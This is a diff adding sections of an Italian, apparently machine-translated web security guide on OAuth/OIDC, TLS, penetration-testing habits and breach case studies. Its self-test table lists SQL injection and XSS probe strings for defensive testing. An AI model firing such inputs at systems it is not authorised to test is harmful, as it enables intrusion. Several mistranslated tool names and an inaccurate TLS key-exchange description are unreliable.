+                    <text x="340" y="404" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#5b5347">Google controlla il verificatore nel passaggio (6) -&gt; impedisce l'intercettazione del codice di autorizzazione
+                        attacchi</text>
+                </svg>
+                <div class="diagram-caption">Fig A: Flusso del codice di autorizzazione OAuth 2.0 con PKCE. I passaggi (6)-(7) sono
+                    server-server, i token non toccano mai la barra degli URL del browser.</div>
+            </div>
+
+            <h3>Regole di sicurezza chiave per OAuth</h3>
+            <ul>
+                <li><strong>Utilizzare sempre PKCE</strong>: anche per le app lato server. Previene gli attacchi di intercettazione del codice
+                    dove un attaccante intercetta il <code>code</code> dall'URL di reindirizzamento.</li>
+                <li><strong>Convalidare il <code>state</code> parametro</strong>: genera un valore casuale, memorizzalo in
+                    la sessione prima del reindirizzamento, verificala quando Google reindirizza nuovamente. Ciò impedisce CSRF su OAuth
+                    flusso stesso.</li>
+                <li><strong>Non esporre mai <code>access_token</code> al browser</strong>: scambiare il codice
+                    lato server ed emettere il proprio cookie di sessione. Il token di accesso è una credenziale; trattalo come un
+                    parola d'ordine.</li>
+                <li><strong>Collega attentamente OAuth agli account esistenti tramite e-mail</strong>: se un utente ha già un
+                    account email+password e accedi tramite Google con la stessa email, devi decidere: collegamento automatico
+                    (conveniente, piccolo rischio) o richiedere conferma. Il collegamento automatico senza verifica abilita l'account
+                    subentra se il provider OAuth viene compromesso.</li>
+                <li><strong>Verificare il <code>aud</code> (pubblico) affermazione</strong> nell'id_token, garantisce il token
+                    è stato rilasciato per <em>tuo</em> app, non un altro client OAuth che utilizza lo stesso provider.</li>
+            </ul>
+
+            <h3>OIDC e OAuth 2.0: differenza su una riga</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Protocollo</th>
+                        <th>Risposte</th>
+                        <th>Gettone</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>OAuth 2.0</strong></td>
+                        <td>&quot;Cosa può fare questa app?&quot;</td>
+                        <td>Token di accesso (opaco o JWT)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>OIDC</strong></td>
+                        <td>&quot;Chi è questo utente?&quot;</td>
+                        <td>Token ID (sempre JWT con <code>sub</code>, <code>email</code>, <code>iat</code>)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <pre><span class="lang-label">Go / Verify OIDC ID Token (google/go-oidc)</span><span class="kw">import</span> (
+    <span class="str">"github.com/coreos/go-oidc/v3/oidc"</span>
+    <span class="str">"golang.org/x/oauth2"</span>
+)
+
+<span class="kw">var</span> (
+    provider, _ = oidc.NewProvider(ctx, <span class="str">"https://accounts.google.com"</span>)
+    verifier     = provider.Verifier(&amp;oidc.Config{ClientID: os.Getenv(<span class="str">"GOOGLE_CLIENT_ID"</span>)})
+    oauth2Cfg    = &amp;oauth2.Config{
+        ClientID:     os.Getenv(<span class="str">"GOOGLE_CLIENT_ID"</span>),
+        ClientSecret: os.Getenv(<span class="str">"GOOGLE_CLIENT_SECRET"</span>),
+        RedirectURL:  <span class="str">"https://yourapp.com/auth/callback"</span>,
+        Scopes:       []<span class="type">string</span>{oidc.ScopeOpenID, <span class="str">"email"</span>, <span class="str">"profile"</span>},
+        Endpoint:     provider.Endpoint(),
+    }
+)
+
+<span class="kw">func</span> <span class="fn">callbackHandler</span>(w http.ResponseWriter, r *http.Request) {
+    <span class="cmt">// 1. Verify state matches what we stored in session (CSRF protection)</span>
+    <span class="kw">if</span> r.URL.Query().Get(<span class="str">"state"</span>) != getSessionState(r) {
+        http.Error(w, <span class="str">"invalid state"</span>, <span class="num">400</span>); <span class="kw">return</span>
+    }
+
+    <span class="cmt">// 2. Exchange code for tokens (server-to-server)</span>
+    token, _ := oauth2Cfg.Exchange(ctx, r.URL.Query().Get(<span class="str">"code"</span>))
+    rawIDToken := token.Extra(<span class="str">"id_token"</span>).(<span class="type">string</span>)
+
+    <span class="cmt">// 3. Verify ID token signature + aud + exp</span>
+    idToken, err := verifier.Verify(ctx, rawIDToken)
+    <span class="kw">if</span> err != nil { http.Error(w, <span class="str">"invalid token"</span>, <span class="num">401</span>); <span class="kw">return</span> }
+
+    <span class="cmt">// 4. Extract claims</span>
+    <span class="kw">var</span> claims <span class="kw">struct</span> { Email <span class="type">string</span> <span class="str">`json:"email"`</span>; Sub <span class="type">string</span> <span class="str">`json:"sub"`</span> }
+    idToken.Claims(&amp;claims)
+
+    <span class="cmt">// 5. Upsert user in DB, create session, set cookie</span>
+    userID := upsertUser(claims.Sub, claims.Email)
+    setSecureSessionCookie(w, userID)
+    http.Redirect(w, r, <span class="str">"/dashboard"</span>, http.StatusFound)
+}</pre>
+        </section>
+
+        <!-- 17 TLS -->
+        <section id="tls">
+            <div class="section-header"><span class="badge">17</span>
+                <h2>Interni HTTPS e TLS</h2>
+            </div>
+
+            <p>HTTPS è HTTP con un livello TLS (Transport Layer Security) tra la connessione TCP e il tuo HTTP
+                messaggi. Tutto al suo interno, intestazioni, corpo, cookie, token, è crittografato durante il transito. Un aggressore
+                chi intercetta i pacchetti vede solo testo cifrato casuale.</p>
+
+            <h3>Perché TLS è importante per un ingegnere backend</h3>
+            <ul>
+                <li>Senza HTTPS, i cookie di sessione e i token JWT vengono rubati da chiunque si trovi sulla stessa rete Wi-Fi (Wireshark
+                    li cattura in testo normale).</li>
+                <li>Il <code>Secure</code> il flag cookie funziona solo su HTTPS, senza di esso i cookie vengono inviati su HTTP
+                    anche.</li>
+                <li>HTTP/2 (e HTTP/3) richiedono TLS, l'assenza di TLS non significa alcun vantaggio in termini di prestazioni.</li>
+                <li>I motori di ricerca penalizzano i siti HTTP; i browser mostrano avvisi &quot;Non sicuro&quot;.</li>
+            </ul>
+
+            <h3>La stretta di mano TLS: cosa succede realmente</h3>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 360" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="360" fill="#fff" />
+                    <defs>
+                        <marker id="ta" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#5b5347" />
+                        </marker>
+                        <marker id="tg" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#3f6f4e" />
+                        </marker>
+                        <marker id="tb" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#37607f" />
+                        </marker>
+                    </defs>
+                    <!-- Columns -->
+                    <text x="120" y="28" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="13"
+                        font-weight="700" fill="#211e1a">Cliente (browser)</text>
+                    <text x="560" y="28" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="13"
+                        font-weight="700" fill="#211e1a">Server (il tuo backend)</text>
+                    <line x1="120" y1="35" x2="120" y2="350" stroke="#d8cfbe" stroke-width="1" stroke-dasharray="4 3" />
+                    <line x1="560" y1="35" x2="560" y2="350" stroke="#d8cfbe" stroke-width="1" stroke-dasharray="4 3" />
+
+                    <!-- Step 1: ClientHello -->
+                    <line x1="122" y1="60" x2="558" y2="60" stroke="#5b5347" stroke-width="1.5" marker-end="url(#ta)" />
+                    <text x="340" y="52" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#5b5347">(1) ClientHello: versione TLS, suite di crittografia, random_client</text>
+
+                    <!-- Step 2: ServerHello -->
+                    <line x1="558" y1="100" x2="122" y2="100" stroke="#5b5347" stroke-width="1.5"
+                        marker-end="url(#ta)" />
+                    <text x="340" y="92" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#5b5347">(2) ServerHello: cifra scelta, random_server, certificato (chiave pubblica)</text>
+
+                    <!-- Step 3: Certificate verification -->
+                    <rect x="20" y="115" width="200" height="35" rx="6" fill="#f0e5c9" stroke="#b07d2b" />
+                    <text x="120" y="130" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="10"
+                        fill="#b07d2b" font-weight="700">(3) Il cliente verifica il certificato</text>
+                    <text x="120" y="143" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="10"
+                        fill="#5b5347">Catena di fiducia -&gt; CA radice</text>
+
+                    <!-- Step 4: Key exchange -->
+                    <line x1="122" y1="175" x2="558" y2="175" stroke="#37607f" stroke-width="1.5"
+                        marker-end="url(#tb)" />
+                    <text x="340" y="167" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#37607f">(4) Key Exchange (ECDHE): il client invia la condivisione della chiave crittografata con quella pubblica del server
+                        chiave</text>
+
+                    <!-- Step 5: Both derive session key -->
+                    <rect x="160" y="190" width="360" height="30" rx="6" fill="#dee5ee" stroke="#37607f" />
+                    <text x="340" y="210" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#37607f">(5) Entrambe le parti derivano indipendentemente la stessa chiave di sessione simmetrica</text>
+                    <text x="340" y="222" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9"
+                        fill="#5b5347">(utilizzando random_client + random_server + materiale chiave, mai trasmesso)</text>
+
+                    <!-- Step 6: Finished -->
+                    <line x1="122" y1="245" x2="558" y2="245" stroke="#3f6f4e" stroke-width="1.5"
+                        marker-end="url(#tg)" />
+                    <text x="340" y="237" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#3f6f4e">(6) Client terminato (MAC dell'intero handshake)</text>
+                    <line x1="558" y1="270" x2="122" y2="270" stroke="#3f6f4e" stroke-width="1.5"
+                        marker-end="url(#tg)" />
+                    <text x="340" y="262" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="11"
+                        fill="#3f6f4e">(7) Server terminato, handshake completato</text>
+
+                    <!-- Step 7: Encrypted HTTP -->
+                    <rect x="60" y="290" width="560" height="40" rx="8" fill="#eafaf1" stroke="#3f6f4e" />
+                    <text x="340" y="310" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="12"
+                        font-weight="700" fill="#3f6f4e">(8) Tutto il traffico HTTP successivo crittografato con sessione simmetrica
+                        chiave (AES-GCM)</text>
+                    <text x="340" y="325" text-anchor="middle" font-family="Source Sans 3,sans-serif" font-size="10"
+                        fill="#5b5347">L'intercettatore vede: byte casuali. Cookie di sessione, JWT, password, tutto
+                        invisibile.</text>
+                </svg>
+                <div class="diagram-caption">Figura B, stretta di mano TLS 1.3. La chiave di sessione è <em>derivato</em>, mai
+                    trasmesso, la segretezza in avanti significa che le sessioni passate non possono essere decrittografate anche se il server è privato
+                    la chiave viene successivamente rubata.</div>
+            </div>
+
+            <h3>Concetti chiave</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Concetto</th>
+                        <th>Cosa significa</th>
+                        <th>Perché è importante</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Certificato</strong></td>
+                        <td>Chiave pubblica + identità del server, firmata da una CA</td>
+                        <td>Dimostra che stai parlando con il server reale, non con un imitatore</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Autorità di certificazione (CA)</strong></td>
+                        <td>Terza parte fidata che firma i certificati (Let's Encrypt, DigiCert)</td>
+                        <td>Catena di fiducia: il browser si fida della CA -&gt; CA garantisce il server</td>
+                    </tr>
+                    <tr>
+                        <td><strong>ECDHE</strong></td>
+                        <td>Scambio di chiavi effimere Diffie-Hellman con curva ellittica</td>
+                        <td>Segretezza diretta: ogni sessione utilizza una nuova coppia di chiavi</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Segretezza in avanti</strong></td>
+                        <td>Le chiavi di sessione non vengono archiviate; non è possibile decrittografare il traffico passato nemmeno con la chiave privata</td>
+                        <td>Un futuro compromesso chiave non espone le vecchie sessioni</td>
+                    </tr>
+                    <tr>
+                        <td><strong>HSTS</strong></td>
+                        <td>Intestazione HTTP Strict Transport Security</td>
+                        <td>Forza HTTPS per il tuo dominio, previene gli attacchi di rimozione SSL</td>
+                    </tr>
+                    <tr>
+                        <td><strong>TLS 1.3</strong></td>
+                        <td>Norma attuale (2018). Eliminati i codici deboli da TLS 1.2</td>
+                        <td>Più veloce (handshake 1-RTT), nessuna vulnerabilità nota</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Lista di controllo pratica per il tuo backend</h3>
+            <ul>
+                <li>Utilizzare <strong>Crittifichiamo</strong> (gratuito, con rinnovo automatico) o il certificato del tuo fornitore di servizi cloud
+                    direttore.</li>
+                <li>Impostato <code>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</code>, racconta
+                    browser per utilizzare sempre HTTPS per il tuo dominio per 2 anni.</li>
+                <li>Reindirizza tutto <code>http://</code> traffico verso <code>https://</code> al bilanciamento del carico/inversione
+                    livello proxy (nginx, Caddy, Traefik).</li>
+                <li>Disabilita TLS 1.0 e TLS 1.1, hanno vulnerabilità note (POODLE, BEAST). Consenti solo TLS 1.2
+                    e TLS 1.3.</li>
+                <li>Metti alla prova la tua configurazione TLS su <a href="https://www.ssllabs.com/ssltest/"
+                        target="_blank">ssllabs.com/ssltest</a>, puntare a una valutazione A+.</li>
+            </ul>
+
+            <pre><span class="lang-label">Caddy / Automatic HTTPS (zero config)</span><span class="cmt"># Caddyfile, Caddy automatically obtains and renews Let's Encrypt certs</span>
+yourapp.com {
+    reverse_proxy localhost:8080
+    <span class="cmt"># TLS 1.2+ enforced, HSTS set, HTTP redirected, all automatic</span>
+}
+
+<span class="cmt"># nginx equivalent</span>
+server {
+    listen 443 ssl;
+    ssl_certificate     /etc/letsencrypt/live/yourapp.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/yourapp.com/privkey.pem;
+    ssl_protocols       TLSv1.2 TLSv1.3;   <span class="cmt"># disable 1.0 and 1.1</span>
+    ssl_ciphers         ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+    add_header Strict-Transport-Security <span class="str">"max-age=63072000"</span> always;
+}</pre>
+        </section>
+
+        <!-- 18 PENTEST -->
+        <section id="pentest">
+            <div class="section-header"><span class="badge">18</span>
+                <h2>Mentalità del penetration test: pensa prima di spedire</h2>
+            </div>
+
+            <p>Il Penetration Test (pentesting) è la pratica di attaccare il proprio sistema come un vero aggressore
+                farebbero, prima che ne abbiano la possibilità. Non è necessario essere un pentester professionista per applicare questa mentalità.
+                L’obiettivo è sviluppare l’abitudine di chiedere <em>&quot;come potrei romperlo?&quot;</em> prima della distribuzione.</p>
+
+            <h3>La metodologia dell'attaccante (Guida al test OWASP)</h3>
+            <ol>
+                <li><strong>Ricognizione</strong>: Quali endpoint esistono? Quale stack tecnologico? Quali messaggi di errore
+                    perdita? (<code>nmap</code>, Google dorking, esame dei bundle JS)</li>
+                <li><strong>Enumerazione</strong>: Quali ID utente esistono? Quali percorsi? Fuzz con ID sequenziali, comune
+                    percorsi (<code>/admin</code>, <code>/.env</code>, <code>/api/v1</code>)</li>
+                <li><strong>Sfruttamento</strong>: prova i payload di injection, ignora l'autenticazione, aumenta i privilegi</li>
+                <li><strong>Post-sfruttamento</strong>: Cosa può essere esfiltrato, modificato o distrutto?</li>
+            </ol>
+
+            <h3>Lista di controllo rapida per l'autoverifica</h3>
+            <p>Prima di pubblicare qualsiasi funzionalità che influisca sui dati utente o sull'autenticazione, eseguili manualmente o in modo automatizzato
+                test:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Controlla</th>
+                        <th>Cosa testare</th>
+                        <th>Strumento/Metodo</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Iniezione SQL</strong></td>
+                        <td>Metti <code>'</code>, <code>'; DROP TABLE--</code>, <code>' OR '1'='1</code> in ogni ingresso
+                            campo</td>
+                        <td>sqlmap, manuale</td>
+                    </tr>
+                    <tr>
+                        <td><strong>BOLA</strong></td>
+                        <td>Effettuato l'accesso come Utente A, richiedi gli ID risorsa dell'Utente B</td>
+                        <td>Manuale + Rutto Suite</td>
+                    </tr>
+                    <tr>
+                        <td><strong>BFLA</strong></td>
+                        <td>Rimuovi il cookie/ruolo di amministrazione, prova a raggiungere gli endpoint di amministrazione</td>
+                        <td>Manuale</td>
+                    </tr>
+                    <tr>
+                        <td><strong>XSS</strong></td>
+                        <td>Invia <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in ogni campo di testo</td>
+                        <td>Manuale, OWASP ZAP</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Bypass di autenticazione</strong></td>
+                        <td>Rimuovi completamente l'intestazione di autenticazione. Prova i token scaduti. Prova i token di un altro utente.</td>
+                        <td>Manuale</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Segreti</strong></td>
+                        <td>Cerca nella codebase e nella cronologia git le chiavi hardcoded</td>
+                        <td>gitleaks, tartufo</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Intestazioni di sicurezza</strong></td>
+                        <td>Controlla le intestazioni di risposta per CSP, HSTS, X-Frame-Options</td>
+                        <td>securityheaders.com</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Limitazione della velocità</strong></td>
+                        <td>Invia più di 100 tentativi di accesso, controlla se bloccato</td>
+                        <td>arricciare il cappio, dir6</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Burp Suite: lo strumento standard</h3>
+            <p>Burp Suite Community Edition (gratuito) è un proxy che si trova tra il tuo browser e il tuo backend, lasciando
+                intercetti, modifichi e riproduci ogni richiesta. È lo strumento più utilizzato per il pentesting manuale.
+            </p>
+            <ul>
+                <li><strong>Intercettare</strong>: mette in pausa una richiesta durante il volo e modifica qualsiasi parametro prima che raggiunga il tuo
+                    servitore.</li>
+                <li><strong>Ripetitore</strong>: riprodurre una richiesta con payload diversi (ottimo per testare l'iniezione).
+                </li>
+                <li><strong>Intruso</strong>: fuzzing automatizzato, prova migliaia di payload rispetto a un parametro
+                    automaticamente.</li>
+                <li><strong>Scanner</strong> (Solo Pro), scansione automatizzata delle vulnerabilità.</li>
+            </ul>
+
+            <h3>PortSwigger Web Security Academy: apprendimento gratuito in laboratorio</h3>
+            <p>La migliore risorsa gratuita per pratiche pratiche di sicurezza. Ogni vulnerabilità ha:</p>
+            <ul>
+                <li>Una chiara spiegazione della teoria</li>
+                <li>Un laboratorio interattivo (una vera app web vulnerabile, nel browser)</li>
+                <li>Una soluzione se rimani bloccato</li>
+            </ul>
+            <p>Iniziare con: SQL Injection -&gt; XSS -&gt; IDOR (BOLA) -&gt; Vulnerabilità di autenticazione -&gt; Controllo degli accessi. Ciascuno
+                Il modulo dura 1-3 ore e ti insegna più di quanto la lettura teorica da sola possa mai fare.</p>
+
+            <div class="callout tip">Il cambiamento di mentalità che conta di più: smettere di pensare &quot;gli utenti faranno questo?&quot; e iniziare
+                pensando &quot;che cos'è?&quot; <em>peggiore</em> possibile input che potrei ricevere qui, e cosa succede se lo faccio?&quot;
+                Scrivilo come caso di prova. Eseguilo in CI.</div>
+
+            <h3>Test di sicurezza automatizzati in CI/CD</h3>
+            <pre><span class="lang-label">GitHub Actions / Security scan on every PR</span>name: Security Scan
+on: [pull_request]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with: { fetch-depth: 0 }  <span class="cmt"># full history for secret scanning</span>
+
+      <span class="cmt"># Scan for hardcoded secrets in entire git history</span>
+      - name: Gitleaks
+        uses: gitleaks/gitleaks-action@v2
+
+      <span class="cmt"># Static analysis for Go security issues</span>
+      - name: Gosec
+        uses: securego/gosec@master
+        with:
+          args: ./...
+
+      <span class="cmt"># Dependency vulnerability check</span>
+      - name: Nancy (Go deps)
+        run: |
+          go list -json -m all | nancy sleuth</pre>
+        </section>
+
+        <!-- 19 INCIDENTS -->
+        <section id="incidents">
+            <div class="section-header"><span class="badge">19</span>
+                <h2>Casi di studio di incidenti reali</h2>
+            </div>
+
+            <p>La teoria diventa più difficile quando si vede quanto costa alle aziende reali. Questi sono quattro tra i più istruttivi
+                violazioni della sicurezza, ciascuna causata direttamente da una vulnerabilità trattata in questo capitolo.</p>
+
+            <h3>(1) Equifax (2017): SQL Injection/Dipendenza senza patch</h3>
+            <div class="callout danger">SSN, date di nascita, indirizzi e numeri di carte di credito di 147 milioni di persone
+                rubato. Equifax ha pagato circa 700 milioni di dollari in risarcimenti.</div>
+            <p><strong>Cosa è successo:</strong> Gli aggressori hanno sfruttato una vulnerabilità nota (CVE-2017-5638) in Apache
+                Struts, un framework web Java utilizzato da Equifax. La vulnerabilità ha consentito agli aggressori di eseguire sistemi operativi arbitrari
+                comandi tramite un'intestazione HTTP appositamente predisposta. Era disponibile una patch per <em>due mesi</em> prima
+                la violazione. Equifax non l'aveva applicato.</p>
+            <p><strong>Cosa è mancato:</strong></p>
+            <ul>
+                <li>Nessuna scansione automatizzata delle vulnerabilità delle dipendenze in CI/CD.</li>
+                <li>Nessun processo per applicare urgentemente patch ai CVE critici.</li>
+                <li>Rete interna non segmentata, gli aggressori si sono spostati lateralmente e hanno avuto accesso a 48 database aggiuntivi una volta
+                    dentro.</li>
+                <li>L'ispezione SSL è stata disabilitata a causa di un certificato interno scaduto, il traffico dannoso è andato via
+                    non rilevato per 76 giorni.</li>
+            </ul>
+            <p><strong>Lezione:</strong> Mantieni aggiornate le dipendenze. Esegui scansioni CVE automatizzate (<code>dependabot</code>,
+                <code>snyk</code>, <code>nancy</code>) su ogni build. Applica le patch di sicurezza critiche entro 24-72
+                ore.</p>
+
+            <h3>(2) Uber (2022): Segreti nel codice + Ingegneria sociale</h3>
+            <div class="callout danger">L'aggressore ha ottenuto l'accesso ai sistemi interni di Uber, all'area di lavoro Slack, ad AWS, GCP,
+                Segnalazioni di bug e codice sorgente di HackerOne. Nessun dato è stato venduto, ma l'accesso è stato totale.</div>
+            <p><strong>Cosa è successo:</strong> Un aggressore di 18 anni ha utilizzato la fatica del MFA (bombardando un appaltatore di Uber
+                con notifiche push finché non ne accettano una) per ottenere l'accesso iniziale. Hanno quindi trovato un PowerShell
+                script su una condivisione di rete interna che conteneva <strong>credenziali di amministratore hardcoded</strong> per
+                Strumento PAM (Privileged Access Management) di Uber. Con quelle credenziali avevano accesso virtuale
+                tutto.</p>
+            <p><strong>Cosa è mancato:</strong></p>
+            <ul>
+                <li>Segreti hardcoded in uno script su una condivisione interna, non in un gestore dei segreti.</li>
+                <li>Nessuna autenticazione resistente all'MFA (chiavi hardware/passkey) per l'accesso privilegiato.</li>
+                <li>Fatica da push MFA non mitigata (nessuna corrispondenza dei numeri, nessun limite di velocità sui tentativi di push).</li>
+                <li>Accesso eccessivamente privilegiato agli appaltatori, troppi movimenti laterali possibili da un account compromesso.
+                </li>
+            </ul>
+            <p><strong>Lezione:</strong> I segreti appartengono a un gestore dei segreti (AWS Secrets Manager, HashiCorp Vault,
+                Doppler), mai in script, file di configurazione o messaggi di chat. Utilizza MFA resistente al phishing (chiavi hardware)
+                per l'accesso amministrativo. Applica il privilegio minimo ovunque.</p>
+
+            <h3>(3) Facebook (2018): Autorizzazione interrotta (furto di token di accesso)</h3>
+            <div class="callout danger">Rubati 50 milioni di token di accesso utente a causa di un bug nella funzione &quot;Visualizza come&quot;.
+                Gli aggressori potrebbero accedere come uno qualsiasi di quei 50 milioni di utenti.</div>
+            <p><strong>Cosa è successo:</strong> La funzione &quot;Visualizza come&quot; consente agli utenti di vedere il proprio profilo come farebbe un altro utente
+                vederlo. Un bug in questa funzionalità causava la generazione errata di un componente di caricamento video con un live
+                token di accesso, appartenente all'utente visualizzato, non al visualizzatore. Tre bug compositi hanno creato questo
+                difetto:</p>
+            <ol>
+                <li>Il caricatore video veniva erroneamente mostrato in modalità &quot;Visualizza come&quot;.</li>
+                <li>L'autore del caricamento ha generato un token di accesso per l'utente sbagliato (l'utente visualizzato, non il visualizzatore).</li>
+                <li>Il token di accesso aveva autorizzazioni complete per l'account anziché un ambito limitato.</li>
+            </ol>
+            <p><strong>Lezione:</strong> L'autorizzazione è difficile da testare manualmente su larga scala. Si applica il principio BOLA:
+                verificare la proprietà in ogni punto di accesso ai dati. Utilizza token di breve durata e con ambito minimo. Costruisci automatizzato
+                test specifici per i confini dell'autorizzazione.</p>
+
+            <h3>(4) LastPass (2022): Compromissione della macchina dello sviluppatore -&gt; Dati di produzione</h3>
+            <div class="callout danger">Gli aggressori hanno rubato gli archivi di password crittografati di tutti i clienti LastPass. In corso
+                gli attacchi di forza bruta contro password principali deboli potrebbero continuare a decrittografare i depositi per anni.</div>
+            <p><strong>Cosa è successo:</strong> Gli aggressori hanno prima compromesso il computer di casa di un ingegnere DevOps
+                sfruttando un pacchetto software multimediale vulnerabile (Plex). Quella macchina aveva accesso al cloud LastPass
+                ambiente di backup. Attraverso quell'unica macchina di sviluppo, gli aggressori hanno esfiltrato:</p>
+            <ul>
+                <li>Casseforti crittografate con password del cliente (i gioielli della corona)</li>
+                <li>Metadati del cliente (e-mail, indirizzo di fatturazione, indirizzi IP)</li>
+                <li>Configurazione e segreti dell'infrastruttura cloud</li>
+            </ul>
+            <p><strong>Cosa è mancato:</strong></p>
+            <ul>
+                <li>Le macchine degli sviluppatori non dovrebbero avere accesso diretto agli ambienti di backup di produzione, utilizzare bastion
+                    host e accesso just-in-time.</li>
+                <li>Le macchine personali utilizzate per lavoro dovrebbero essere registrate in MDM (Mobile Device Management) con sicurezza
+                    politiche applicate.</li>
+                <li>La crittografia del vault utilizzava PBKDF2 con un basso numero di iterazioni, le password principali più deboli sono violabili
+                    non in linea.</li>
+                <li>Nessuna anomalia rilevata sull'insolito volume di dati esfiltrati.</li>
+            </ul>
+            <p><strong>Lezione:</strong> La catena di fornitura fa parte della tua superficie di attacco. Il laptop domestico di uno sviluppatore lo è
+                parte del perimetro di sicurezza. Accesso alla produzione del segmento. Monitorare l'esfiltrazione di dati anomali. Utilizzare
+                chiavi di sicurezza hardware per l'accesso alla produzione.</p>
+
+            <h3>Filo conduttore comune a tutti e quattro</h3>
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 120" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="120" fill="#fff" />
+                    <rect x="20" y="20" width="140" height="80" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="90" y="52" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Equifax</text>
+                    <text x="90" y="68" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Presupposto: &quot;lo faremo</text>
+                    <text x="90" y="82" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">patchalo più tardi&quot;</text>
+                    <rect x="178" y="20" width="140" height="80" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="248" y="52" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Uber</text>
+                    <text x="248" y="68" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Presupposto: &quot;questo</text>
+                    <text x="248" y="82" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">la sceneggiatura è interna&quot;</text>
+                    <rect x="336" y="20" width="140" height="80" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="406" y="52" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Facebook</text>
+                    <text x="406" y="68" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Presupposto: &quot;Aut</text>
+                    <text x="406" y="82" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">controllato al routing&quot;</text>
+                    <rect x="494" y="20" width="165" height="80" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="576" y="52" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">LastPass</text>
+                    <text x="576" y="68" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">Presupposto: &quot;portatile di sviluppo</text>
+                    <text x="576" y="82" text-anchor="middle" fill="#5b5347" font-family="Source Sans 3,sans-serif"
+                        font-size="10">è fuori perimetro&quot;</text>
+                </svg>
+                <div class="diagram-caption">Fig C: Ogni violazione è riconducibile a un presupposto che si è rivelato sbagliato.
+                    La sicurezza è la gestione dei presupposti.</div>
+            </div>
+        </section>
+
+        <!-- 20 REFS -->
+        <section id="refs">
+            <div class="section-header"><span class="badge">20</span>
+                <h2>Riferimenti e ulteriori letture</h2>
+            </div>
+            <div class="ref-links">
+                <a class="ref-link" href="https://portswigger.net/web-security" target="_blank">PortSwiggerWeb
+                    Accademia della Sicurezza</a>
+                <a class="ref-link" href="https://owasp.org/www-project-top-ten/" target="_blank">OWASPTop 10</a>
+                <a class="ref-link" href="https://cheatsheetseries.owasp.org/" target="_blank">Foglio informativo OWASP
+                    Serie</a>
+                <a class="ref-link"
+                    href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+                    target="_blank">Foglio informativo sull'autenticazione OWASP</a>
+                <a class="ref-link"
+                    href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+                    target="_blank">Gestione delle sessioni OWASP</a>
+                <a class="ref-link"
+                    href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+                    target="_blank">Prevenzione dell'iniezione SQL OWASP</a>
+                <a class="ref-link" href="https://lucia-auth.com/" target="_blank">Lucia Auth (autenticazione sicura
+                    modelli)</a>
